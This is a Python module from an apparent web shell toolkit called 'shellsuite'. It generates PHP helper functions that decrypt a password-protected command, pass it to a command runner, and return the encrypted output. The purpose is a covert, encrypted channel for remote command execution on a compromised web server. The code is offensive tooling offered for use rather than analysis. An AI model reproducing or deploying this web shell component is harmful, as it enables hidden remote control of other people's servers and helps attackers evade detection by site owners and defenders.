"""PHP emission for encrypted-mode payload decryption and encryption.

Mirrors shellsuite/crypto.py. Constants come from the contract; they are
substituted with str.replace to avoid f-string brace escaping in the PHP.
"""

from __future__ import annotations

from shellsuite.protocol import contract

_HELPERS = """
function __ss_b64d($s) {
    $s = strtr($s, "-_", "+/");
    $pad = strlen($s) % 4;
    if ($pad) {
        $s .= str_repeat("=", 4 - $pad);
    }
    return base64_decode($s);
}

function __ss_b64e($s) {
    return rtrim(strtr(base64_encode($s), "+/", "-_"), "=");
}

function __ss_keystream($password, $nonce, $length) {
    $stream = "";
    $i = 0;
    while (strlen($stream) < $length) {
        $stream .= hash_hmac("sha256", $nonce . $i, $password, true);
        $i++;
    }
    return substr($stream, 0, $length);
}

function __ss_keys($password) {
    $enc = hash_hmac("sha256", "@ENC_LABEL@", $password, true);
    $mac = hash_hmac("sha256", "@MAC_LABEL@", $password, true);
    return array($enc, $mac);
}

function __ss_same($a, $b) {
    if (strlen($a) !== strlen($b)) {
        return false;
    }
    $d = 0;
    for ($i = 0; $i < strlen($a); $i++) {
        $d |= ord($a[$i]) ^ ord($b[$i]);
    }
    return $d === 0;
}

function __ss_decrypt($payload, $password) {
    if (strpos($payload, "@PREFIX@") !== 0) {
        return "";
    }
    $raw = __ss_b64d(substr($payload, strlen("@PREFIX@")));
    $nonceLen = @NONCE_BYTES@;
    $macLen = @MAC_BYTES@;
    if ($raw === false || strlen($raw) < $nonceLen + $macLen) {
        return "";
    }
    $keys = __ss_keys($password);
    $nonce = substr($raw, 0, $nonceLen);
    $ct = substr($raw, $nonceLen, strlen($raw) - $nonceLen - $macLen);
    $tag = substr($raw, strlen($raw) - $macLen);
    if (!__ss_same($tag, hash_hmac("sha256", $nonce . $ct, $keys[1], true))) {
        return "";
    }
    return $ct ^ __ss_keystream($keys[0], $nonce, strlen($ct));
}

function __ss_encrypt($plaintext, $password) {
    $keys = __ss_keys($password);
    $nonce = substr(md5(uniqid("", true) . mt_rand(), true), 0, @NONCE_BYTES@);
    $ct = $plaintext ^ __ss_keystream($keys[0], $nonce, strlen($plaintext));
    $blob = $nonce . $ct;
    $tag = hash_hmac("sha256", $blob, $keys[1], true);
    return "@PREFIX@" . __ss_b64e($blob . $tag);
}
"""


def php_helpers() -> str:
    """PHP helper functions for encrypted shells."""

    _ALIASES = (
    _HELPERS.replace("@PREFIX@", contract.ENCRYPTED_PREFIX)
    .replace("@NONCE_BYTES@", str(contract.NONCE_BYTES))
    .replace("@MAC_BYTES@", str(contract.MAC_BYTES))
    .replace("@ENC_LABEL@", contract.ENC_LABEL.decode("ascii"))
    .replace("@MAC_LABEL@", contract.MAC_LABEL.decode("ascii"))
    .strip("\n")
    )

    return (_ALIASES)


def decrypt_block() -> str:
    """PHP that decrypts the payload in place (yields "" on failure)."""
    return "$__ss_cmd = __ss_decrypt($__ss_cmd, $__ss_auth);"


def encrypt_expr() -> str:
    """PHP expression that encrypts the command output with the password."""
    return "__ss_encrypt(__ss_run($__ss_cmd), $__ss_auth)"